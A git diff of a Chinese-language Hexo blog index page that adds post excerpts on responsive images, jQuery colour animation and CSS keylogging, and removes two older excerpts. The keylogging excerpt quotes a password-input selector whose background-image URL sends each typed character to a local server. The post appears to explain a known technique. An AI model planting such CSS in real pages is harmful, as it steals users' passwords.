@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 
 
@@ -100,7 +100,7 @@
 </nav>
 
     <div class="view intro-2" id="background"
-         style="background: url('/img/default.jpg')no-repeat center center;
+         style="background: url('/img/default.png')no-repeat center center;
            background-size: cover;
            background-attachment: fixed;">
       <div class="full-bg-img">
@@ -133,6 +133,106 @@
               <div class="col-12 col-md-10 m-auto">
                 
 
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/11/18/%E5%9B%BE%E7%89%87%E8%87%AA%E9%80%82%E5%BA%94%E7%9A%84%E4%BA%94%E7%A7%8D%E5%8F%AF%E8%83%BD/">
+        <p class="h4 index-header">图片自适应的五种可能</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">
+transform实现居中
+background
+object-fit
+height使用vw单位
+活用padding
+
+在自适应问题上，图片的自适应可以说是最关键了。
+在仿做小红书的过程中，我也遇到了这个问题，小红书作为一个商品展示性的社区，商品图片的自适应是很重要的。在放眼望去都是图片的页面里，一两个变形可能会极大地影响用户的感受。
+我在两个地方遇到了图片适应的问题，一个是品牌精选的卡片，对于宽固定，图片高度不规则并且比容器本身要大的情况；还有一个是在做九宫格要求图片宽高一致。
+transform实现居中这是小红书官方采用的方案，设置外层overflow:hidden，然后将内部图片设置居中，多余的部分直接被隐藏。这种方案对于不能明确容器和待展示图片大小关系的情况时并不使用。
+background主要应用到的是一个background-size:cover属性，这个属性可以使图片适应填满，多余的部分会被裁剪掉。
+123background-image:url();background-size: cover;background-posiiton:center;
+
+这种方案是目前使</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-11-18&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/11/18/%E4%BD%BF%E7%94%A8Css%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/">
+        <p class="h4 index-header">使用Css获取用户密码</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">不一样的 css说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。
+话题回到不一样的 css 上，github 上 jbtronics 给出了这样一份答案 CrookedStyleSheets，在这里笔者直接给上该项目的中文文档，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。
+css 监听键盘记录CSS-Keylogging 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，CSS-Keylogging 更为巧妙的使用多重选择器去捕获相应的按键事件。
+核心代码如下:
+1input[type=&quot;password&quot;][value$=&quot;1&quot;] &#123; background-image: url(&quot;http://localhost:3000/1&quot;); &#1</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-11-18&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/11/18/%E5%85%B3%E4%BA%8EjQuery%E4%B8%AD%E2%80%9Canimate-%E2%80%9D%E5%87%BD%E6%95%B0%E5%AF%B9%E9%A2%9C%E8%89%B2%E5%8F%98%E5%8C%96%E7%9A%84%E6%94%AF%E6%8C%81/">
+        <p class="h4 index-header">关于jQuery中“animate()”函数对颜色变化的支持</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">我要做得就是让下面一段代码生效：
+1$("#yourid").stop().animate(&#123; "backgroundColor" : "#rrggbb", "color" : "#rrggbb" &#125;, "fast");
+
+　　但是，很遗憾，一点也没有动。本来效果应该跟这个版本的xcoder博客的天头导航条一样有个动态效果（只不过xcoder的导航条是透明度变化，而项目中我想让它背景色变化）。
+　　原因是什么呢？死月上网查了很久，找到的东西都很简单地说明了一下，貌似都可以。嘛，也许是jQuery新版本不支持这个特性了吧。
+　　最后，死月在jQuery的官方文档中找到了下面这段话——
+
+All animated properties should be animated to a single numeric value\, except as noted below; most properties that are non-numeric cannot be animated using basic jQuery functionality (For exampl</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-11-18&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
 
   <div class="row mb-4 mx-auto">
     
@@ -431,80 +531,19 @@ drop table student</div>
     </div>
   </div>
 
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/10/30/JAVA%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">
-        <p class="h4 index-header">JAVA面向对象知识点汇总</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">第二章 类和对象的创建1.面向对象的概念面向对象的思想是把一个项目，一件事情分成更小的项目，或者说分成一个个更小的部分，每一部分负责什么方面的功能，最后再由这些部分组合而成为一个整体。
-2.类的创建
-12语法：public class 类名&#123;&#125;			File---&gt;new---&gt;class---&gt;类名
-
-3.创建对象类名 对象名 =new 类名()；对象名.方法名()；对象名.属性4.构造方法：方法名和类名相同，没有返回值
-123public class 类名&#123;		public 类名（）&#123;&#125;//主要作用是初始化操作&#125;
-
-5.构造方法的重载：在同一个类中，方法名相同，参数个数，顺序，类型不相同的构造方法
-1234public class 类名&#123;			public 类名（）&#123;&#125;			public 类名（String name，int age）&#123;&#125;&#125;
-
-6.构造方法的执行：new 类名（）；—&gt;执行构造方法super（）；—&gt;执行了父类的构造方</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-10-30&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/10/30/hello-world/">
-        <p class="h4 index-header">Hello World</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick StartCreate a new post1$ hexo new "My New Post"
-
-More info: Writing
-Run server1$ hexo server
-
-More info: Server
-Generate static files1$ hexo generate
-
-More info: Generating
-Deploy to remote sites1$ hexo deploy
-
-More info: Deployment
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-10-30&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
 
 
+  <nav aria-label="index posts navigation">
+    <ul class="pagination pg-blue justify-content-center mt-5">
+      
+      
+      
+        <li class="page-item">
+          <a class="page-link" href="/page/2/#board">Next</a>
+        </li>
+      
+    </ul>
+  </nav>
 
 
 
@@ -583,7 +622,7 @@ More info: Deployment
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "「如果你掉进了黑暗里，你能做的，不过是静心等待，直到你的双眼适应黑暗」&nbsp;",
+        "&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
